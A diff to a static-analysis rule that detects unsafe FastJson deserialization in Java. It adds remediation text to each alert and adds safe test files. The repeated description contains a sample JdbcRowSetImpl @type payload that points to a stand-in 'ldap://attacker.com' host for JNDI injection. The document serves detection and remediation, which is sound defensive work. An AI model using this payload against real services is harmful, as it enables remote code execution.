@@ -1,104 +1,88 @@
 desc(
-	title: "SCA: Check Java FastJson Vulnerability"
-	title_zh: "SCA: 检测Java FastJson依赖漏洞"
+	title: "Check Java FastJson Vulnerability"
+	title_zh: "检测Java FastJson依赖漏洞"
 	type: vuln
 	level: high
 	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
-   FastJson 是一个流行的 Java 库，用于将 Java 对象转换为 JSON 格式，以及从 JSON 解析为 Java 对象。在某些旧版本中，FastJson 存在反序列化漏洞。当应用程序使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法处理来自不受信任来源的 JSON 数据时，如果 JSON 字符串中包含恶意构造的类型信息（`@type` 字段），FastJson 会尝试实例化并调用指定类的任意方法，从而导致远程代码执行。利用该漏洞，攻击者可以将恶意 payload 通过 JSON 数据发送给应用程序，触发任意代码在服务器上执行。
-
+FastJson 是一个流行的 Java 库，用于将 Java 对象转换为 JSON 格式，以及从 JSON 解析为 Java 对象。在某些旧版本中，FastJson 存在反序列化漏洞。当应用程序使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法处理来自不受信任来源的 JSON 数据时，如果 JSON 字符串中包含恶意构造的类型信息（`@type` 字段），FastJson 会尝试实例化并调用指定类的任意方法，从而导致远程代码执行。利用该漏洞，攻击者可以将恶意 payload 通过 JSON 数据发送给应用程序，触发任意代码在服务器上执行。
 2. **触发场景**
-   当应用程序使用了存在漏洞的 FastJson 版本（例如 1.2.24、1.2.47 等旧版本），并且接收并直接解析用户可控的 JSON 数据时，就可能触发该漏洞。
-
-   **示例代码 (存在漏洞):**
-   ```java
-   import com.alibaba.fastjson.JSON;
-
-   public class UnsafeFastjsonDemo {
-       public static void main(String[] args) {
-           String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/evil\",\"autoCommit\":true}";
-           // 直接解析用户输入的JSON字符串
-           Object obj = JSON.parse(jsonString);
-           System.out.println(obj);
-       }
-   }
-   ```
-   攻击者可以构造包含恶意 `@type` 字段的 JSON 字符串，例如指向 JNDI Datasource 实现类，通过 LDAP 或 RMI 调用远程恶意类，最终导致代码执行。
-   
-   此外，即使升级到较新的版本，如果在配置中明确开启了 AutoType 或者使用了 `Feature.SupportAutoType`，或者在反序列化时指定了`ParserConfig.global.addAccept()`允许了危险类前缀，仍然可能存在风险。
-
+当应用程序使用了存在漏洞的 FastJson 版本（例如 1.2.24、1.2.47 等旧版本），并且接收并直接解析用户可控的 JSON 数据时，就可能触发该漏洞。
+**示例代码 (存在漏洞):**
+```java
+import com.alibaba.fastjson.JSON;
+public class UnsafeFastjsonDemo {
+    public static void main(String[] args) {
+        String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/evil\",\"autoCommit\":true}";
+        // 直接解析用户输入的JSON字符串
+        Object obj = JSON.parse(jsonString);
+        System.out.println(obj);
+    }
+}
+```
+攻击者可以构造包含恶意 `@type` 字段的 JSON 字符串，例如指向 JNDI Datasource 实现类，通过 LDAP 或 RMI 调用远程恶意类，最终导致代码执行。
+此外，即使升级到较新的版本，如果在配置中明确开启了 AutoType 或者使用了 `Feature.SupportAutoType`，或者在反序列化时指定了`ParserConfig.global.addAccept()`允许了危险类前缀，仍然可能存在风险。
 3. **潜在影响**
-   - **远程代码执行 (RCE):** 攻击者可以在目标服务器上执行任意代码，完全控制应用程序和服务器。
-   - **数据泄露/篡改:** 通过执行任意代码，攻击者可以访问、窃取或修改数据库中的敏感数据。
-   - **系统破坏:** 攻击者可能删除文件、关闭服务或进行其他恶意操作，导致系统瘫痪。
-   - **内网渗透:** 利用受攻击的服务器作为跳板，攻击者可能进一步攻击内网的其他系统。
+- **远程代码执行 (RCE):** 攻击者可以在目标服务器上执行任意代码，完全控制应用程序和服务器。
+- **数据泄露/篡改:** 通过执行任意代码，攻击者可以访问、窃取或修改数据库中的敏感数据。
+- **系统破坏:** 攻击者可能删除文件、关闭服务或进行其他恶意操作，导致系统瘫痪。
+- **内网渗透:** 利用受攻击的服务器作为跳板，攻击者可能进一步攻击内网的其他系统。
 DESC
 	rule_id: "a4abf901-de0e-4959-a310-5b0adbef046b"
 	solution: <<<SOLUTION
 ### 修复建议
-
 1. **升级 FastJson 版本至最新版本**
-   由于 FastJson 的反序列化漏洞在多个版本中存在，最直接和有效的修复方法是升级到官方已修复漏洞的最新版本。官方在 1.2.83 及之后的版本已经对 AutoType 功能进行了限制和增强，显著降低了反序列化风险。
-
-   **示例 (Maven pom.xml):**
-   ```xml
-   <dependency>
-       <groupId>com.alibaba</groupId>
-       <artifactId>fastjson</artifactId>
-       <version>2.0.43</version>  <!-- 升级到最新的安全版本 -->
-   </dependency>
-   ```
-   或者:
-   ```xml
-   <dependency>
-       <groupId>com.alibaba</groupId>
-       <artifactId>fastjson</artifactId>
-       <version>1.2.83</version>  <!-- 或更高的小版本 -->
-   </dependency>
-   ```
-
+由于 FastJson 的反序列化漏洞在多个版本中存在，最直接和有效的修复方法是升级到官方已修复漏洞的最新版本。官方在 1.2.83 及之后的版本已经对 AutoType 功能进行了限制和增强，显著降低了反序列化风险。
+**示例 (Maven pom.xml):**
+```xml
+<dependency>
+    <groupId>com.alibaba</groupId>
+    <artifactId>fastjson</artifactId>
+    <version>2.0.43</version>  <!-- 升级到最新的安全版本 -->
+</dependency>
+```
+或者:
+```xml
+<dependency>
+    <groupId>com.alibaba</groupId>
+    <artifactId>fastjson</artifactId>
+    <version>1.2.83</version>  <!-- 或更高的小版本 -->
+</dependency>
+```
 2. **避免使用 `JSON.parseObject(String text)` 或 `JSON.parse(String text)` 等不安全的方法**
-   如果无法立即升级版本，或者需要处理来自不可信源的 JSON，应避免使用会触发 AutoType 的默认反序列化方法。优先使用带有明确目标类型的方法，例如 `JSON.parseObject(String text, Class<T> clazz)`。
-
-   **示例コード (安全):**
-   ```java
-   import com.alibaba.fastjson.JSON;
-   import com.example.YourObject;
-
-   public class SafeFastjsonDemo {
-       public static void main(String[] args) {
-           String jsonString = "{\"name\":\"test\",\"age\":18}";
-           // 指定目标类型反序列化
-           YourObject obj = JSON.parseObject(jsonString, YourObject.class);
-           System.out.println(obj);
-       }
-   }
-   ```
-
+如果无法立即升级版本，或者需要处理来自不可信源的 JSON，应避免使用会触发 AutoType 的默认反序列化方法。优先使用带有明确目标类型的方法，例如 `JSON.parseObject(String text, Class<T> clazz)`。
+**示例代码 (安全):**
+```java
+import com.alibaba.fastjson.JSON;
+import com.example.YourObject;
+public class SafeFastjsonDemo {
+    public static void main(String[] args) {
+        String jsonString = "{\"name\":\"test\",\"age\":18}";
+        // 指定目标类型反序列化
+        YourObject obj = JSON.parseObject(jsonString, YourObject.class);
+        System.out.println(obj);
+    }
+}
+```
 3. **禁用 AutoType**
-   如果业务允许，可以显式禁用 AutoType 功能（虽然在高版本中默认是关闭的，但在旧版本或特定配置下需要手动关闭）。
-
-   ```java
-   import com.alibaba.fastjson.JSON;
-   import com.alibaba.fastjson.parser.Feature;
-
-   public class DisableAutoTypeDemo {
-       public static void main(String[] args) {
-           String jsonString = "..."; // 用户输入
-           // 在解析时禁用 AutoType
-           Object obj = JSON.parseObject(jsonString, Object.class, Feature.DisableAutoType);
-           System.out.println(obj);
-       }
-   }
-   ```
-
+如果业务允许，可以显式禁用 AutoType 功能（虽然在高版本中默认是关闭的，但在旧版本或特定配置下需要手动关闭）。
+```java
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+public class DisableAutoTypeDemo {
+    public static void main(String[] args) {
+        String jsonString = "..."; // 用户输入
+        // 在解析时禁用 AutoType
+        Object obj = JSON.parseObject(jsonString, Object.class, Feature.DisableAutoType);
+        System.out.println(obj);
+    }
+}
+```
 4. **对输入的 JSON 进行严格验证**
-   在服务接收并解析 JSON 之前，对输入进行结构、类型和内容的严格校验，确保输入符合预期的格式和业务规则，拒绝可疑的 JSON 数据。
-
+在服务接收并解析 JSON 之前，对输入进行结构、类型和内容的严格校验，确保输入符合预期的格式和业务规则，拒绝可疑的 JSON 数据。
 5. **最小化权限原则**
-   运行应用程序的用户应具备最低必要的系统权限，即使发生漏洞利用，也能限制攻击者造成的损害。
+运行应用程序的用户应具备最低必要的系统权限，即使发生漏洞利用，也能限制攻击者造成的损害。
 SOLUTION
 	reference: <<<REFERENCE
 [Fastjson 反序列化漏洞](https://forum.butian.net/share/914)
@@ -112,11 +96,91 @@ check $vulnerable;
 
 FastJsonHttpMessageConverter()?{<getCall><getCallee><name>?{have: '.add'}} as $config;
 alert $config for {
-	title: "SCA: Check Java FastJson Vulnerability",
-	title_zh: "SCA: 检测Java FastJson依赖漏洞",
 	level: "high",
 	message_zh: "FastJson 配置类中使用了 FastJsonHttpMessageConverter",
 	message: "FastJson configuration class uses FastJsonHttpMessageConverter",
+	solution: <<<SOLUTION
+### 修复建议
+1. **升级 FastJson 版本至最新版本**
+由于 FastJson 的反序列化漏洞在多个版本中存在，最直接和有效的修复方法是升级到官方已修复漏洞的最新版本。官方在 1.2.83 及之后的版本已经对 AutoType 功能进行了限制和增强，显著降低了反序列化风险。
+**示例 (Maven pom.xml):**
+```xml
+<dependency>
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>2.0.43</version>  <!-- 升级到最新的安全版本 -->
+</dependency>
+```
+或者:
+```xml
+<dependency>
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>1.2.83</version>  <!-- 或更高的小版本 -->
+</dependency>
+```
+2. **避免使用 `JSON.parseObject(String text)` 或 `JSON.parse(String text)` 等不安全的方法**
+如果无法立即升级版本，或者需要处理来自不可信源的 JSON，应避免使用会触发 AutoType 的默认反序列化方法。优先使用带有明确目标类型的方法，例如 `JSON.parseObject(String text, Class<T> clazz)`。
+**示例代码 (安全):**
+```java
+import com.alibaba.fastjson.JSON;
+import com.example.YourObject;
+public class SafeFastjsonDemo {
+public static void main(String[] args) {
+String jsonString = "{\"name\":\"test\",\"age\":18}";
+// 指定目标类型反序列化
+YourObject obj = JSON.parseObject(jsonString, YourObject.class);
+System.out.println(obj);
+}
+}
+```
+3. **禁用 AutoType**
+如果业务允许，可以显式禁用 AutoType 功能（虽然在高版本中默认是关闭的，但在旧版本或特定配置下需要手动关闭）。
+```java
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+public class DisableAutoTypeDemo {
+public static void main(String[] args) {
+String jsonString = "..."; // 用户输入
+// 在解析时禁用 AutoType
+Object obj = JSON.parseObject(jsonString, Object.class, Feature.DisableAutoType);
+System.out.println(obj);
+}
+}
+```
+4. **对输入的 JSON 进行严格验证**
+在服务接收并解析 JSON 之前，对输入进行结构、类型和内容的严格校验，确保输入符合预期的格式和业务规则，拒绝可疑的 JSON 数据。
+5. **最小化权限原则**
+运行应用程序的用户应具备最低必要的系统权限，即使发生漏洞利用，也能限制攻击者造成的损害。
+SOLUTION
+	risk: "SCA",
+	desc: <<<DESC
+### 漏洞描述
+1. **漏洞原理**
+FastJson 是一个流行的 Java 库，用于将 Java 对象转换为 JSON 格式，以及从 JSON 解析为 Java 对象。在某些旧版本中，FastJson 存在反序列化漏洞。当应用程序使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法处理来自不受信任来源的 JSON 数据时，如果 JSON 字符串中包含恶意构造的类型信息（`@type` 字段），FastJson 会尝试实例化并调用指定类的任意方法，从而导致远程代码执行。利用该漏洞，攻击者可以将恶意 payload 通过 JSON 数据发送给应用程序，触发任意代码在服务器上执行。
+2. **触发场景**
+当应用程序使用了存在漏洞的 FastJson 版本（例如 1.2.24、1.2.47 等旧版本），并且接收并直接解析用户可控的 JSON 数据时，就可能触发该漏洞。
+**示例代码 (存在漏洞):**
+```java
+import com.alibaba.fastjson.JSON;
+public class UnsafeFastjsonDemo {
+public static void main(String[] args) {
+String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/evil\",\"autoCommit\":true}";
+// 直接解析用户输入的JSON字符串
+Object obj = JSON.parse(jsonString);
+System.out.println(obj);
+}
+}
+```
+攻击者可以构造包含恶意 `@type` 字段的 JSON 字符串，例如指向 JNDI Datasource 实现类，通过 LDAP 或 RMI 调用远程恶意类，最终导致代码执行。
+此外，即使升级到较新的版本，如果在配置中明确开启了 AutoType 或者使用了 `Feature.SupportAutoType`，或者在反序列化时指定了`ParserConfig.global.addAccept()`允许了危险类前缀，仍然可能存在风险。
+3. **潜在影响**
+- **远程代码执行 (RCE):** 攻击者可以在目标服务器上执行任意代码，完全控制应用程序和服务器。
+- **数据泄露/篡改:** 通过执行任意代码，攻击者可以访问、窃取或修改数据库中的敏感数据。
+- **系统破坏:** 攻击者可能删除文件、关闭服务或进行其他恶意操作，导致系统瘫痪。
+- **内网渗透:** 利用受攻击的服务器作为跳板，攻击者可能进一步攻击内网的其他系统。
+DESC
+	name: "config",
 }
 
 
@@ -126,8 +190,88 @@ alert $parseObjectCall for {
 	level: "high",
 	message_zh: "FastJson 使用了不安全的 parseObject/parse 方法",
 	message: "FastJson uses the unsafe parseObject/parse method",
-	title: "SCA: Check Java FastJson Vulnerability",
-	title_zh: "SCA: 检测Java FastJson依赖漏洞",
+	solution: <<<SOLUTION
+### 修复建议
+1. **升级 FastJson 版本至最新版本**
+由于 FastJson 的反序列化漏洞在多个版本中存在，最直接和有效的修复方法是升级到官方已修复漏洞的最新版本。官方在 1.2.83 及之后的版本已经对 AutoType 功能进行了限制和增强，显著降低了反序列化风险。
+**示例 (Maven pom.xml):**
+```xml
+<dependency>
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>2.0.43</version>  <!-- 升级到最新的安全版本 -->
+</dependency>
+```
+或者:
+```xml
+<dependency>
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>1.2.83</version>  <!-- 或更高的小版本 -->
+</dependency>
+```
+2. **避免使用 `JSON.parseObject(String text)` 或 `JSON.parse(String text)` 等不安全的方法**
+如果无法立即升级版本，或者需要处理来自不可信源的 JSON，应避免使用会触发 AutoType 的默认反序列化方法。优先使用带有明确目标类型的方法，例如 `JSON.parseObject(String text, Class<T> clazz)`。
+**示例代码 (安全):**
+```java
+import com.alibaba.fastjson.JSON;
+import com.example.YourObject;
+public class SafeFastjsonDemo {
+public static void main(String[] args) {
+String jsonString = "{\"name\":\"test\",\"age\":18}";
+// 指定目标类型反序列化
+YourObject obj = JSON.parseObject(jsonString, YourObject.class);
+System.out.println(obj);
+}
+}
+```
+3. **禁用 AutoType**
+如果业务允许，可以显式禁用 AutoType 功能（虽然在高版本中默认是关闭的，但在旧版本或特定配置下需要手动关闭）。
+```java
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+public class DisableAutoTypeDemo {
+public static void main(String[] args) {
+String jsonString = "..."; // 用户输入
+// 在解析时禁用 AutoType
+Object obj = JSON.parseObject(jsonString, Object.class, Feature.DisableAutoType);
+System.out.println(obj);
+}
+}
+```
+4. **对输入的 JSON 进行严格验证**
+在服务接收并解析 JSON 之前，对输入进行结构、类型和内容的严格校验，确保输入符合预期的格式和业务规则，拒绝可疑的 JSON 数据。
+5. **最小化权限原则**
+运行应用程序的用户应具备最低必要的系统权限，即使发生漏洞利用，也能限制攻击者造成的损害。
+SOLUTION
+	risk: "SCA",
+	desc: <<<DESC
+### 漏洞描述
+1. **漏洞原理**
+FastJson 是一个流行的 Java 库，用于将 Java 对象转换为 JSON 格式，以及从 JSON 解析为 Java 对象。在某些旧版本中，FastJson 存在反序列化漏洞。当应用程序使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法处理来自不受信任来源的 JSON 数据时，如果 JSON 字符串中包含恶意构造的类型信息（`@type` 字段），FastJson 会尝试实例化并调用指定类的任意方法，从而导致远程代码执行。利用该漏洞，攻击者可以将恶意 payload 通过 JSON 数据发送给应用程序，触发任意代码在服务器上执行。
+2. **触发场景**
+当应用程序使用了存在漏洞的 FastJson 版本（例如 1.2.24、1.2.47 等旧版本），并且接收并直接解析用户可控的 JSON 数据时，就可能触发该漏洞。
+**示例代码 (存在漏洞):**
+```java
+import com.alibaba.fastjson.JSON;
+public class UnsafeFastjsonDemo {
+public static void main(String[] args) {
+String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/evil\",\"autoCommit\":true}";
+// 直接解析用户输入的JSON字符串
+Object obj = JSON.parse(jsonString);
+System.out.println(obj);
+}
+}
+```
+攻击者可以构造包含恶意 `@type` 字段的 JSON 字符串，例如指向 JNDI Datasource 实现类，通过 LDAP 或 RMI 调用远程恶意类，最终导致代码执行。
+此外，即使升级到较新的版本，如果在配置中明确开启了 AutoType 或者使用了 `Feature.SupportAutoType`，或者在反序列化时指定了`ParserConfig.global.addAccept()`允许了危险类前缀，仍然可能存在风险。
+3. **潜在影响**
+- **远程代码执行 (RCE):** 攻击者可以在目标服务器上执行任意代码，完全控制应用程序和服务器。
+- **数据泄露/篡改:** 通过执行任意代码，攻击者可以访问、窃取或修改数据库中的敏感数据。
+- **系统破坏:** 攻击者可能删除文件、关闭服务或进行其他恶意操作，导致系统瘫痪。
+- **内网渗透:** 利用受攻击的服务器作为跳板，攻击者可能进一步攻击内网的其他系统。
+DESC
+	name: "parseObjectCall",
 }
 
 <include('java-spring-mvc-param')> as $entry;
@@ -140,9 +284,89 @@ CODE
 alert $reachable for {
 	message_zh: "FastJson 使用了不安全的 parseObject/parse 方法(Springboot / Servlet参数可达)",
 	message: "FastJson uses the unsafe parseObject/parse method (parameter reachable)",
-	title: "SCA: Check Java FastJson Vulnerability",
-	title_zh: "SCA: 检测Java FastJson依赖漏洞",
 	level: "high",
+	risk: "SCA",
+	desc: <<<DESC
+### 漏洞描述
+1. **漏洞原理**
+FastJson 是一个流行的 Java 库，用于将 Java 对象转换为 JSON 格式，以及从 JSON 解析为 Java 对象。在某些旧版本中，FastJson 存在反序列化漏洞。当应用程序使用 `JSON.parseObject()` 或 `JSON.parse()` 等方法处理来自不受信任来源的 JSON 数据时，如果 JSON 字符串中包含恶意构造的类型信息（`@type` 字段），FastJson 会尝试实例化并调用指定类的任意方法，从而导致远程代码执行。利用该漏洞，攻击者可以将恶意 payload 通过 JSON 数据发送给应用程序，触发任意代码在服务器上执行。
+2. **触发场景**
+当应用程序使用了存在漏洞的 FastJson 版本（例如 1.2.24、1.2.47 等旧版本），并且接收并直接解析用户可控的 JSON 数据时，就可能触发该漏洞。
+**示例代码 (存在漏洞):**
+```java
+import com.alibaba.fastjson.JSON;
+public class UnsafeFastjsonDemo {
+public static void main(String[] args) {
+String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/evil\",\"autoCommit\":true}";
+// 直接解析用户输入的JSON字符串
+Object obj = JSON.parse(jsonString);
+System.out.println(obj);
+}
+}
+```
+攻击者可以构造包含恶意 `@type` 字段的 JSON 字符串，例如指向 JNDI Datasource 实现类，通过 LDAP 或 RMI 调用远程恶意类，最终导致代码执行。
+此外，即使升级到较新的版本，如果在配置中明确开启了 AutoType 或者使用了 `Feature.SupportAutoType`，或者在反序列化时指定了`ParserConfig.global.addAccept()`允许了危险类前缀，仍然可能存在风险。
+3. **潜在影响**
+- **远程代码执行 (RCE):** 攻击者可以在目标服务器上执行任意代码，完全控制应用程序和服务器。
+- **数据泄露/篡改:** 通过执行任意代码，攻击者可以访问、窃取或修改数据库中的敏感数据。
+- **系统破坏:** 攻击者可能删除文件、关闭服务或进行其他恶意操作，导致系统瘫痪。
+- **内网渗透:** 利用受攻击的服务器作为跳板，攻击者可能进一步攻击内网的其他系统。
+DESC
+	name: "reachable",
+	solution: <<<SOLUTION
+### 修复建议
+1. **升级 FastJson 版本至最新版本**
+由于 FastJson 的反序列化漏洞在多个版本中存在，最直接和有效的修复方法是升级到官方已修复漏洞的最新版本。官方在 1.2.83 及之后的版本已经对 AutoType 功能进行了限制和增强，显著降低了反序列化风险。
+**示例 (Maven pom.xml):**
+```xml
+<dependency>
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>2.0.43</version>  <!-- 升级到最新的安全版本 -->
+</dependency>
+```
+或者:
+```xml
+<dependency>
+<groupId>com.alibaba</groupId>
+<artifactId>fastjson</artifactId>
+<version>1.2.83</version>  <!-- 或更高的小版本 -->
+</dependency>
+```
+2. **避免使用 `JSON.parseObject(String text)` 或 `JSON.parse(String text)` 等不安全的方法**
+如果无法立即升级版本，或者需要处理来自不可信源的 JSON，应避免使用会触发 AutoType 的默认反序列化方法。优先使用带有明确目标类型的方法，例如 `JSON.parseObject(String text, Class<T> clazz)`。
+**示例代码 (安全):**
+```java
+import com.alibaba.fastjson.JSON;
+import com.example.YourObject;
+public class SafeFastjsonDemo {
+public static void main(String[] args) {
+String jsonString = "{\"name\":\"test\",\"age\":18}";
+// 指定目标类型反序列化
+YourObject obj = JSON.parseObject(jsonString, YourObject.class);
+System.out.println(obj);
+}
+}
+```
+3. **禁用 AutoType**
+如果业务允许，可以显式禁用 AutoType 功能（虽然在高版本中默认是关闭的，但在旧版本或特定配置下需要手动关闭）。
+```java
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+public class DisableAutoTypeDemo {
+public static void main(String[] args) {
+String jsonString = "..."; // 用户输入
+// 在解析时禁用 AutoType
+Object obj = JSON.parseObject(jsonString, Object.class, Feature.DisableAutoType);
+System.out.println(obj);
+}
+}
+```
+4. **对输入的 JSON 进行严格验证**
+在服务接收并解析 JSON 之前，对输入进行结构、类型和内容的严格校验，确保输入符合预期的格式和业务规则，拒绝可疑的 JSON 数据。
+5. **最小化权限原则**
+运行应用程序的用户应具备最低必要的系统权限，即使发生漏洞利用，也能限制攻击者造成的损害。
+SOLUTION
 }
 
 
@@ -254,4 +478,51 @@ public class UserController {
     }
 }
 CONTROLLER
+	"safefile://SafeFastjsonUpgrade.java": <<<CODE
+// 使用最新版本的FastJson
+import com.alibaba.fastjson.JSON;
+
+public class SafeFastjsonUpgrade {
+    public static void main(String[] args) {
+        // 假设已经升级Fastjson到安全版本（例如1.2.83及以上或2.0.x）
+        String jsonString = "{\"name\":\"test\",\"age\":18}";
+        // 即使使用parse方法，由于版本安全，此时风险大大降低
+        // 但仍推荐使用指定类型的方法
+        Object obj = JSON.parse(jsonString);
+        System.out.println(obj);
+
+        // 推荐的使用方式：指定目标类型反序列化
+        User user = JSON.parseObject(jsonString, User.class);
+        System.out.println("Parsed User: " + user.name + ", " + user.age);
+    }
+}
+
+class User {
+    public String name;
+    public int age;
+}
+CODE
+	"safefile://SafeFastjsonTypedParse.java": <<<CODE
+// 始终使用带有明确目标类型的方法进行反序列化
+import com.alibaba.fastjson.JSON;
+
+public class SafeFastjsonTypedParse {
+    public static void main(String[] args) {
+        String jsonString = "{\"name\":\"John Doe\",\"age\":30}";
+        // 明确指定目标类型，即使旧版本Fastjson也更能规避风险
+        MyObject obj = JSON.parseObject(jsonString, MyObject.class);
+        System.out.println("Name: " + obj.name + ", Age: " + obj.age);
+
+        // 另一个示例：解析到List<String>
+        String jsonListString = "[\"item1\",\"item2\"]";
+        java.util.List<String> list = JSON.parseObject(jsonListString, new com.alibaba.fastjson.TypeReference<java.util.List<String>>() {}.getType());
+        System.out.println("List: " + list);
+    }
+}
+
+class MyObject {
+    public String name;
+    public int age;
+}
+CODE
 )
